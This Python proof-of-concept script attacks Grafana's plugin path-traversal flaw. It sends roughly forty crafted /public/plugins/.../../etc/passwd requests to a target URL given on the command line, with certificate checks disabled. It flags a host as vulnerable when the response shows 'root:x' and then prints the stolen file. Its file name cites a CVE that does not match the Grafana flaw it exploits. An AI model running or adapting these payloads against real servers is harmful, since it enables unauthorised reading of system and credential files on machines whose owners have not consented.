#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
@Project ：UzJuSecurityTools 
@File    ：CVE-2021-45232_POC.py
@Author  ：UzJu
@Date    ：2021/12/7 4:52 下午 
@Email   ：UzJuer@163.com
'''
import requests
import re
import sys

requests.packages.urllib3.disable_warnings()
requests.DEFAULT_RETRIES = 100


class Grafana:
    def __init__(self, url):
        self.url = url
        self.req = requests.session()
        self.payload = [
            '/public/plugins/grafana-clock-panel/../../../../../../etc/passwd',
            '/public/plugins/alertlist/../../../../../../../../../../../etc/passwd',
            '/public/plugins/annolist/../../../../../../../../../../../etc/passwd',
            '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../../../../etc/passwd',
            '/public/plugins/barchart/../../../../../../../../../../../etc/passwd',
            '/public/plugins/bargauge/../../../../../../../../../../../etc/passwd',
            '/public/plugins/cloudwatch/../../../../../../../../../../../etc/passwd',
            '/public/plugins/dashlist/../../../../../../../../../../../etc/passwd',
            '/public/plugins/elasticsearch/../../../../../../../../../../../etc/passwd',
            '/public/plugins/gauge/../../../../../../../../../../../etc/passwd',
            '/public/plugins/geomap/../../../../../../../../../../../etc/passwd',
            '/public/plugins/gettingstarted/../../../../../../../../../../../etc/passwd',
            '/public/plugins/stackdriver/../../../../../../../../../../../etc/passwd',
            '/public/plugins/graph/../../../../../../../../../../../etc/passwd',
            '/public/plugins/graphite/../../../../../../../../../../../etc/passwd',
            '/public/plugins/heatmap/../../../../../../../../../../../etc/passwd',
            '/public/plugins/histogram/../../../../../../../../../../../etc/passwd',
            '/public/plugins/influxdb/../../../../../../../../../../../etc/passwd',
            '/public/plugins/jaeger/../../../../../../../../../../../etc/passwd',
            '/public/plugins/logs/../../../../../../../../../../../etc/passwd',
            '/public/plugins/loki/../../../../../../../../../../../etc/passwd',
            '/public/plugins/mssql/../../../../../../../../../../../etc/passwd',
            '/public/plugins/mysql/../../../../../../../../../../../etc/passwd',
            '/public/plugins/news/../../../../../../../../../../../etc/passwd',
            '/public/plugins/nodeGraph/../../../../../../../../../../../etc/passwd',
            '/public/plugins/opentsdb/../../../../../../../../../../../etc/passwd',
            '/public/plugins/piechart/../../../../../../../../../../../etc/passwd',
            '/public/plugins/pluginlist/../../../../../../../../../../../etc/passwd',
            '/public/plugins/postgres/../../../../../../../../../../../etc/passwd',
            '/public/plugins/prometheus/../../../../../../../../../../../etc/passwd',
            '/public/plugins/stat/../../../../../../../../../../../etc/passwd',
            '/public/plugins/state-timeline/../../../../../../../../../../../etc/passwd',
            '/public/plugins/status-history/../../../../../../../../../../../etc/passwd',
            '/public/plugins/table/../../../../../../../../../../../etc/passwd',
            '/public/plugins/table-old/../../../../../../../../../../../etc/passwd',
            '/public/plugins/tempo/../../../../../../../../../../../etc/passwd',
            '/public/plugins/testdata/../../../../../../../../../../../etc/passwd',
            '/public/plugins/text/../../../../../../../../../../../etc/passwd',
            '/public/plugins/timeseries/../../../../../../../../../../../etc/passwd',
            '/public/plugins/welcome/../../../../../../../../../../../etc/passwd',
            '/public/plugins/zipkin/../../../../../../../../../../../etc/passwd'
        ]

    def get_Unauthorized_Read_File(self):
        for i in self.payload:
            print(self.url + i)
            rule = re.compile(r'root:x:*')
            Response = self.req.get(url=self.url + i,
                                    verify=False,
                                    timeout=3)
            if rule.findall(Response.text):
                print(f"[+]target: {self.url + i} exist Vuln\n{Response.text} ")
        print(f"[-]target: {self.url}, no exist Vuln")


def exp(url):
    run = Grafana(url)
    run.get_Unauthorized_Read_File()


if __name__ == '__main__':
    Banner = '''

     .----------------.  .----------------.  .----------------.  .----------------. 
    | .--------------. || .--------------. || .--------------. || .--------------. |
    | | _____  _____ | || |   ________   | || |     _____    | || | _____  _____ | |
    | ||_   _||_   _|| || |  |  __   _|  | || |    |_   _|   | || ||_   _||_   _|| |
    | |  | |    | |  | || |  |_/  / /    | || |      | |     | || |  | |    | |  | |
    | |  | '    ' |  | || |     .'.' _   | || |   _  | |     | || |  | '    ' |  | |
    | |   \ `--' /   | || |   _/ /__/ |  | || |  | |_' |     | || |   \ `--' /   | |
    | |    `.__.'    | || |  |________|  | || |  `.___.'     | || |    `.__.'    | |
    | |              | || |              | || |              | || |              | |
    | '--------------' || '--------------' || '--------------' || '--------------' |
     '----------------'  '----------------'  '----------------'  '----------------' 

        Autor: UzJu   Email: UzJuer@163.com  GitHub: github.com/uzju  
    '''
    print(Banner)
    target = sys.argv[1]
    exp(target)
